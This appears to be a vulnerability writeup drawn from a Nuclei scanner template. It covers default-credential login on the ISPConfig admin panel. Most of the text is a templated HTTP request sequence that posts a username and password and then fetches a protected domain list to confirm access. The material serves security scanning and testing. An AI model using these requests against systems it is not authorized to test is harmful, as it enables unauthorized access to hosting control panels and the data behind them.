# Nuclei Template: ISPConfig Admin - Default Password
**Template ID:** ispconfig-admin-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ispconfig-admin-default-login.yaml`)

## Vulnerability Information & PoC

## Description
ISPConfig Admin Default Password Vulnerability exposes systems to unauthorized access, compromising data integrity and security.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Connection: close
Referer: {{RootURL}}/login/

username={{username}}&password={{password}}&s_mod=login&s_pg=index

GET /sites/web_vhost_domain_list.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Referer: {{RootURL}}/index.php
```

